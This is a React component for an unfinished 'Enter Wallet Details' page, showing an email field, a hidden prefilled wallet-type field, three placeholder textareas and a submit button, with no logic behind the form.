import React from 'react';
import '../../assets/styles/css/wallet-details-entry-page.css';

function WalletDetailsEntryPage() {
  return (
    <section className="wallet-details-entry-section">
      <div className="section-header text-center">Enter Wallet Details</div>
      <div className="form-area">
        <div className="mb-3 ">
          <label htmlFor="exampleFormControlInput1" className="form-label">
            Email address
          </label>
          <input
            type="email"
            className="form-control"
            id="exampleFormControlInput1"
            placeholder="name@example.com"
          ></input>
        </div>
        <div className="mb-3" style={{ display: 'none' }}>
          <label htmlFor="exampleFormControlInput1" className="form-label">
            Wallet type (This section is automatically prefilled)
          </label>
          <input
            type="email"
            className="form-control"
            id="exampleFormControlInput1"
            placeholder="name@example.com"
          ></input>
        </div>
        <div className="mb-3">
          <label htmlFor="exampleFormControlTextarea1" className="form-label">
            Example textarea
          </label>
          <textarea
            className="form-control"
            id="exampleFormControlTextarea1"
            rows="3"
          ></textarea>
        </div>
        <div className="mb-3">
          <label htmlFor="exampleFormControlTextarea1" className="form-label">
            Example textarea
          </label>
          <textarea
            className="form-control"
            id="exampleFormControlTextarea1"
            rows="3"
          ></textarea>
        </div>
        <div className="mb-3">
          <label htmlFor="exampleFormControlTextarea1" className="form-label">
            Example textarea
          </label>
          <textarea
            className="form-control"
            id="exampleFormControlTextarea1"
            rows="3"
          ></textarea>
        </div>
        <div className="submit-button-wrapper">
          <button
            className="show-more-wallet-btn btn submit-button"
            type="submit"
          >
            Submit Wallet Details
          </button>
        </div>
      </div>
    </section>
  );
}

export default WalletDetailsEntryPage;
